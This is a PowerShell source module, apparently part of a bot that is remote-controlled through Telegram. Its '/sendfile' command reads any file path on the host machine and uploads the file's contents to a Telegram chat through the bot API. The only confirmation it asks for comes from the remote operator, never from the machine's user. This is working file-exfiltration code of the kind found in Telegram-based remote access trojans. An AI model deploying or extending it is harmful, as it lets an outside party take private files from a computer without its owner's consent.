# File Transfer Commands

function Get-FileSize {
    param (
        [string]$filePath
    )
    $file = Get-Item $filePath
    $size = $file.Length
    $units = @('B', 'KB', 'MB', 'GB', 'TB')
    $index = 0
    while ($size -gt 1024 -and $index -lt $units.Count - 1) {
        $size = $size / 1024
        $index++
    }
    return [math]::Round($size, 2), $units[$index]
}

function Send-FileToTelegram {
    param (
        [string]$filePath
    )
    try {
        # Check if file exists and is accessible
        if (-not (Test-Path -Path $filePath -PathType Leaf)) {
            throw "File does not exist or is not accessible: $filePath"
        }

        # Try to get file with proper error handling
        $file = Get-Item -Path $filePath -ErrorAction Stop
        if (-not $file) {
            throw "Cannot access file: $filePath"
        }

        # Check if we have read permissions
        try {
            $fileStream = [System.IO.File]::OpenRead($filePath)
            $fileStream.Close()
        }
        catch {
            throw "No permission to read file: $filePath"
        }

        $url = "https://api.telegram.org/bot$($script:botToken)/sendDocument"
        $fileName = $file.Name

        # Create boundary for multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        # Create the request
        $request = [System.Net.WebRequest]::Create($url)
        $request.Method = "POST"
        $request.ContentType = "multipart/form-data; boundary=$boundary"

        # Create the request stream
        $requestStream = $request.GetRequestStream()
        $writer = New-Object System.IO.StreamWriter($requestStream)

        # Add chat_id parameter
        $writer.Write("--$boundary$LF")
        $writer.Write("Content-Disposition: form-data; name=`"chat_id`"$LF$LF")
        $writer.Write("$($script:chatID)$LF")

        # Add file
        $writer.Write("--$boundary$LF")
        $writer.Write("Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF")
        $writer.Write("Content-Type: application/octet-stream$LF$LF")
        $writer.Flush()

        # Write file content
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $requestStream.Write($fileBytes, 0, $fileBytes.Length)
        $writer.Write("$LF")

        # Write final boundary
        $writer.Write("--$boundary--$LF")
        $writer.Flush()
        $writer.Close()
        $requestStream.Close()

        # Get response
        $response = $request.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseStream)
        $responseText = $reader.ReadToEnd()
        $reader.Close()
        $responseStream.Close()
        $response.Close()

        return $true
    }
    catch {
        Send-TelegramMessage -message "Error sending file: $_"
        return $false
    }
}

function Process-FileTransferCommands {
    param (
        [string[]]$parts
    )
    
    switch ($parts[0]) {
        "/sendfile" {
            if ($parts.Length -lt 2) {
                Send-TelegramMessage -message "Usage: /sendfile <file_path>"
                return
            }

            $filePath = $parts[1..($parts.Length - 1)] -join " "
            
            if (-not (Test-Path $filePath)) {
                Send-TelegramMessage -message "File does not exist: $filePath"
                return
            }

            # Check if it's a directory
            if ((Get-Item $filePath) -is [System.IO.DirectoryInfo]) {
                Send-TelegramMessage -message "Cannot send a directory. Please specify a file."
                return
            }

            try {
                $file = Get-Item $filePath -ErrorAction Stop
                $size, $unit = Get-FileSize -filePath $filePath
                
                $fileInfo = @"
File Information:
Name: $($file.Name)
Size: $size $unit
Created: $($file.CreationTime)
Modified: $($file.LastWriteTime)
Type: $($file.Extension)
"@
                
                Send-TelegramMessage -message $fileInfo
                Send-TelegramMessage -message "Do you want to send this file? Reply with 'yes' to confirm or 'no' to cancel."
                
                # Wait for confirmation
                $confirmationReceived = $false
                $startTime = Get-Date
                $timeout = 30 # seconds
                
                while (-not $confirmationReceived -and ((Get-Date) - $startTime).TotalSeconds -lt $timeout) {
                    $updates = Get-TelegramUpdates $script:lastUpdateId
                    foreach ($update in $updates) {
                        $script:lastUpdateId = $update.update_id + 1
                        if ($update.message -and $update.message.text) {
                            $response = $update.message.text.ToLower()
                            if ($response -eq 'yes') {
                                $confirmationReceived = $true
                                if (Send-FileToTelegram -filePath $filePath) {
                                    Send-TelegramMessage -message "File sent successfully!"
                                }
                                break
                            }
                            elseif ($response -eq 'no') {
                                $confirmationReceived = $true
                                Send-TelegramMessage -message "File transfer cancelled."
                                break
                            }
                        }
                    }
                    Start-Sleep -Seconds 1
                }
                
                if (-not $confirmationReceived) {
                    Send-TelegramMessage -message "File transfer timed out. Please try again."
                }
            }
            catch [System.UnauthorizedAccessException] {
                Send-TelegramMessage -message "Access denied. You don't have permission to access this file."
            }
            catch {
                Send-TelegramMessage -message "Error processing file: $_"
            }
        }
    }
} 